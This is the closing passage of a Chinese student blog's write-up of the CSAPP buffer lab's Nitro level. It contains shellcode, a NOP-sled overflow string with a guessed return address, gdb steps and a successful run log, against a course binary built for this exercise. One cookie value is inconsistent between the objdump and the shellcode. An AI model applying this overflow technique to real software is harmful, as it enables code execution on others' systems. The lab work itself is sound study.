+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">08048d0e &lt;testn&gt;:</span><br><span class="line"> 8048d0e:	55                   	push   %ebp</span><br><span class="line"> 8048d0f:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d11:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048d14:	e8 ea 03 00 00       	call   8049103 &lt;uniqueval&gt;</span><br><span class="line"> 8048d19:	89 45 f0             	mov    %eax,-0x10(%ebp)</span><br><span class="line"> 8048d1c:	e8 73 06 00 00       	call   8049394 &lt;getbufn&gt;</span><br><span class="line"> 8048d21:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048d24:	e8 da 03 00 00       	call   8049103 &lt;uniqueval&gt;</span><br><span class="line"> 8048d29:	89 c2                	mov    %eax,%edx</span><br><span class="line"> 8048d2b:	8b 45 f0             	mov    -0x10(%ebp),%eax</span><br><span class="line"> 8048d2e:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048d30:	74 12                	je     8048d44 &lt;testn+0x36&gt;</span><br><span class="line"> 8048d32:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048d35:	68 60 a5 04 08       	push   $0x804a560</span><br><span class="line"> 8048d3a:	e8 21 fc ff ff       	call   8048960 &lt;puts@plt&gt;</span><br><span class="line"> 8048d3f:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048d42:	eb 41                	jmp    8048d85 &lt;testn+0x77&gt;</span><br><span class="line"> 8048d44:	8b 55 f4             	mov    -0xc(%ebp),%edx</span><br><span class="line"> 8048d47:	a1 58 e1 04 08       	mov    0x804e158,%eax</span><br><span class="line"> 8048d4c:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048d4e:	75 22                	jne    8048d72 &lt;testn+0x64&gt;</span><br><span class="line"> 8048d50:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048d53:	ff 75 f4             	pushl  -0xc(%ebp)</span><br><span class="line"> 8048d56:	68 c4 a5 04 08       	push   $0x804a5c4</span><br><span class="line"> 8048d5b:	e8 20 fb ff ff       	call   8048880 &lt;printf@plt&gt;</span><br><span class="line"> 8048d60:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048d63:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048d66:	6a 04                	push   $0x4</span><br><span class="line"> 8048d68:	e8 5e 07 00 00       	call   80494cb &lt;validate&gt;</span><br><span class="line"> 8048d6d:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048d70:	eb 13                	jmp    8048d85 &lt;testn+0x77&gt;</span><br><span class="line"> 8048d72:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048d75:	ff 75 f4             	pushl  -0xc(%ebp)</span><br><span class="line"> 8048d78:	68 e4 a5 04 08       	push   $0x804a5e4</span><br><span class="line"> 8048d7d:	e8 fe fa ff ff       	call   8048880 &lt;printf@plt&gt;</span><br><span class="line"> 8048d82:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048d85:	90                   	nop</span><br><span class="line"> 8048d86:	c9                   	leave  </span><br><span class="line"> 8048d87:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<p>​    首先我们通过提示和汇编代码，首先我们能够确定的是esp和ebp的关系，也就是根据testn的代码，可以知道ebp = esp + 0x18，这也就是我们第一步必须要知道的，因为无论esp的位置如何变化，esp和ebp的关系都是固定的，所以我们将会使用这条语句去更改返回值。</p>
+<p>​    那么我们的汇编代码就可以写出来了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov $0x676fa3c9, %eax</span><br><span class="line">lea 0x18(%esp), %ebp </span><br><span class="line">push $0x8048d21</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>​    然后，就是我们最困难的环节了。我们现在应该如何注入这个恶意代码呢？在网上查相关的题目和题解的时候发现了可以利用nop的语句进行偏移，因为nop虽然不进行任何程序操作，但是会使得程序计数器pc的值递增，我们可以利用这一想法，先让程序返回到一个我们大致猜测的地址，在这个地址及其附近的一大片区域里我们用nop指令（0x90）填充，CPU执行nop指令时除了程序计数器PC自加，别的什么也不做。把我们的代码放在这片区域的高位地址处，程序一路执行nop,就像滑行一样，一路滑到我们的代码才真正开始执行。我们可以利用gdb调试找到这个字符串开始的大致区域。利用</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb)b *<span class="number">0</span>x80493a0</span><br><span class="line">(gdb)print <span class="variable">$ebp</span>-<span class="number">0</span>x208</span><br></pre></td></tr></table></figure>
+<p>​    来进行断点调试，从而确定出我们的随机栈的范围，从中选取最大的作为范围最大值。这里我的最大值是0x55683628，当然不同的电脑不一样，然后我们先将我们的汇编代码进行处理，得到如下的信息：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">3</span>:<span class="number">03</span></span><br><span class="line">zinker &gt;&gt;&gt; gcc -m32 -c nitro_asm.s</span><br><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">3</span>:<span class="number">54</span></span><br><span class="line">zinker &gt;&gt;&gt; objdump -d nitro_asm.o                                       </span><br><span class="line"></span><br><span class="line">nitro_asm.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	b8 c9 ae <span class="number">6</span>f <span class="number">67</span>       	mov    <span class="variable">$0x676faec9</span>,%eax</span><br><span class="line">   <span class="number">5</span>:	<span class="number">8</span>d <span class="number">6</span>c <span class="number">24</span> <span class="number">18</span>          	lea    <span class="number">0</span>x18(%esp),%ebp</span><br><span class="line">   <span class="number">9</span>:	<span class="number">68</span> <span class="number">21</span> <span class="number">8</span>d <span class="number">04</span> <span class="number">08</span>       	push   <span class="variable">$0x8048d21</span></span><br><span class="line">   e:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<p>那么，我们接下来就是要确定长度了，也就是说我们由于不再是getbuf，也就不在是0x28，所以我们去看getbufn，根据mov语句我们可以判断出，这里缓冲区的长度应该是0x208 + 0x4（push操作），也就是0x20c，计算之后发现是524个字节。所以我们最后构造出的字符串就是这个样子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 b8 //自己写的汇编代码会通过不停的nop偏移到这里运行</span><br><span class="line">c9 a3 6f 67 8d 6c 24 18 68 21</span><br><span class="line">8d 04 08 c3 </span><br><span class="line">28 36 68 55 //最大的栈顶保证了一定能够运行到汇编代码</span><br></pre></td></tr></table></figure>
+<p>接下来我们运行一下这个程序，得到下面的结果：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">3</span>:<span class="number">47</span></span><br><span class="line">zinker &gt;&gt;&gt; cat nitro_in.txt | ./hex2raw -n | ./bufbomb -n  -u <span class="number">1170300532</span></span><br><span class="line">Userid: <span class="number">1170300532</span></span><br><span class="line">Cookie: <span class="number">0</span>x676fa3c9</span><br><span class="line">Type string:KABOOM!: getbufn returned <span class="number">0</span>x676fa3c9</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned <span class="number">0</span>x676fa3c9</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned <span class="number">0</span>x676fa3c9</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned <span class="number">0</span>x676fa3c9</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned <span class="number">0</span>x676fa3c9</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
+<p>OK,我们总算是做完了这个实验。</p>
+<h1 id="鸣谢与参考"><a href="#鸣谢与参考" class="headerlink" title="鸣谢与参考"></a>鸣谢与参考</h1><p>感谢@何人听我楚狂声 的帮助。</p>
+<p>感谢@the Beat Generation 给我推Nitro教学的网页。</p>
+<p>感谢@zhwhong 的网页教学。</p>
+<p>参考资料及网页：</p>
+<p>【1】CSAPP，电子工业出版社</p>
+<p>【2】<a href="https://guoziyang.top/posts/csapp_attacklab.html" target="_blank" rel="noopener">https://guoziyang.top/posts/csapp_attacklab.html</a> 当个黑客吧！——CSAPP:Attack Lab</p>
+<p>【3】<a href="https://www.jianshu.com/p/dc41c84cef17" target="_blank" rel="noopener">https://www.jianshu.com/p/dc41c84cef17</a> （我做Nitro的方法就是来源于此，请大家不明白的话务必前去阅读）</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Problem A. Oversized Pancake Flipper/" rel="next" title="Google 2017 Qualifacation Problem A">
+                <i class="fa fa-chevron-left"></i> Google 2017 Qualifacation Problem A
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/对之后的畅想/" rel="prev" title="对之后的畅想">
+                对之后的畅想 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80MDU0OC8xNzA3NQ=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Zinker</p>
+              <p class="site-description motion-element" itemprop="description">Zinker 的博客</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/zinker1999" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://guoziyang.top" title="郭子阳的编程小站" target="_blank">郭子阳的编程小站</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://code.google.com/codejam/past-contests" title="Google jam" target="_blank">Google jam</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.luogu.org/" title="洛谷" target="_blank">洛谷</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://acm.hit.edu.cn" title="哈工大ACM网站" target="_blank">哈工大ACM网站</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://swift.org/" title="Swift文档" target="_blank">Swift文档</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#总体来看一下"><span class="nav-number">1.</span> <span class="nav-text">总体来看一下</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验准备"><span class="nav-number">2.</span> <span class="nav-text">实验准备</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bufbomb"><span class="nav-number">2.1.</span> <span class="nav-text">bufbomb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#makecookie"><span class="nav-number">2.2.</span> <span class="nav-text">makecookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hex2raw"><span class="nav-number">2.3.</span> <span class="nav-text">hex2raw</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Smoke"><span class="nav-number">3.</span> <span class="nav-text">Smoke</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Fizz"><span class="nav-number">4.</span> <span class="nav-text">Fizz</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Bang"><span class="nav-number">5.</span> <span class="nav-text">Bang</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Boom"><span class="nav-number">6.</span> <span class="nav-text">Boom</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Nitro"><span class="nav-number">7.</span> <span class="nav-text">Nitro</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#鸣谢与参考"><span class="nav-number">8.</span> <span class="nav-text">鸣谢与参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Zinker</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">24.7k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tsumiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
